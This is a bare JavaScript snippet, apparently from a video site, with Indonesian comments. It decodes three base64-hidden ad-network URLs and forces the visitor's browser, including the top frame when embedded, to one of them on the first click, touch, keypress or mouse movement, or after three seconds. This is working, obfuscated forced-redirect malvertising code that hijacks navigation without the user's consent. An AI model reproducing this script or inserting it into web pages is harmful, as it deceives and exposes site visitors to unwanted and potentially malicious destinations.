<script>
(function () {
  // PASTIKAN semua URL https
  const adLinks = {
    1: atob("aHR0cHM6Ly9wcm9maXRibGVjcG0uY29tL3YxcmJyNTgxeGtleT0yNTYzY2I5MWFmZDIxZDQwYTQ2ZTlhMmYwNzJhYzg2NS5waHA="),
    2: atob("aHR0cHM6Ly9wcm9maXRibGVjcG0uY29tL3M0OGdteXE4d2tleT1lNmUxMzJjYjg2ZjRlMDk0ZjlkMjU5ZTA2YzdlYTIxMi5waHA="),
    3: atob("aHR0cHM6Ly9wcm9maXRibGVjcG0uY29tL3MzdGk0b2Q2c2VrZXk9Y21zZjM5YzltazExYzE1ZTA1MzU0MGFmODI1ZWFiYmNmMzMzZDhlZTRk")
  };

  function getBlock() {
    try {
      const saved = localStorage.getItem("vidoy_user_block");
      if (saved) return parseInt(saved, 10);
      const r = Math.floor(Math.random() * 3) + 1;
      localStorage.setItem("vidoy_user_block", String(r));
      return r;
    } catch { return Math.floor(Math.random() * 3) + 1; }
  }

  const block = getBlock();
  const redirectLink = adLinks[block];
  const FLAG = "__vidoy_redirect_done__";

  function go(url) {
    if (!url || window[FLAG]) return;
    window[FLAG] = true;
    try {
      if (top && top !== self) { try { top.location.href = url; return; } catch(e){} }
      location.assign(url);
    } catch { location.href = url; }
  }

  const once = { once: true, capture: true, passive: true };
  const trigger = () => go(redirectLink);

  // lebih banyak pemicu biar nggak “meleset”
  document.addEventListener('click', trigger, once);
  document.addEventListener('touchstart', trigger, once);
  document.addEventListener('keydown', trigger, once);
  document.addEventListener('mousemove', trigger, once);

  // fallback pelan kalau user diem
  setTimeout(trigger, 3000);
})();
</script>
